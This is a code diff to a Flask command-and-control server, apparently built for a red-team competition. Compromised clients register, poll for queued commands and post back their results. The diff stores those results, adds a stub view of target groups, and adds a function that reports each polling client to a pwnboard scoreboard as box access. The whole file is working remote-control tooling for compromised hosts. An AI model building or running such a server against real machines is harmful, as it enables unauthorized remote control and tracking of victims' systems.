@@ -1,5 +1,7 @@
 from flask import Flask, request, jsonify, render_template
-# import requests
+import requests
+import sys
+import json
 from datetime import datetime
 from termcolor import colored
 from ipaddress import ip_address, ip_network
@@ -45,6 +47,7 @@ def input():
 @app.route('/command', methods=['GET'])
 def send_command():
     client_id = request.args.get('client_id') # defaults to None apparently?
+    sendUpdate(client_id)
     cmd = client_commands.get(client_id)
 
     if client_id in clients: # if valid client id was parsed
@@ -74,20 +77,57 @@ def register_client():
         client_commands[client_id] = {"command": None, "timestamp": datetime.min}
     return jsonify(status="client registered", client_id=client_id)
 
+command_results = {}  # 'client_id': 'result'
 
 @app.route('/', methods=['POST']) # callbacks
 def command_result():
+    client_id = request.args.get('client_id')
     result = request.json.get('result') # GET from client
     # wtf is a result rename that
     status = request.args.get('status')
+    command_results[client_id] = result
     print(colored("\nclient command result:\n" + result + "\n", "blue"))
     return jsonify({"status": status})
+
+@app.route('/callbacks', methods=['GET'])
+def callbacks():
+    toRet = {}
+    # for group in groups:
+    #     toRet[group] = []
+    return {
+        "example-group": [{"192.168.1.20": ["command1", "command2", "command3"]}, {"192.168.2.20": ["command1", "command2", "command3"]}],
+        "example-group-2": ["192.168.1.90", "192.168.2.90"]
+    }
+    '''
+    for group in groups:
+        add group as a key in toRet
+        for the value, make a list
+        for thing in client_commands: ('client_id': 'command', 'timestamp')
+            add thing to list
+    '''
+
+    # group_result = {}
+    # for group, clients in groups.items():
+    #     group_result[group] = [command_results.get(client_id, "nothign yet") for client_id in clients]
+    # return render_template('callbacks.html', group_result=group_result)
 
 
 @app.route('/clients')
 def show_clients():
     return clients
 
+def sendUpdate(ips, name="leahfr"):
+    host = "https://pwnboard.win/pwn/boxaccess"
+    # Here ips is a list of IP addresses to update
+    # If we are only updating 1 IP, use "ip" and pass a string
+    data = {'ip': ips, 'type': name}
+    try:
+        req = requests.post(host, json=data, timeout=3)
+        print(req.text)
+        return True
+    except Exception as E:
+        print(E)
+        return False
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5005, threaded=True)
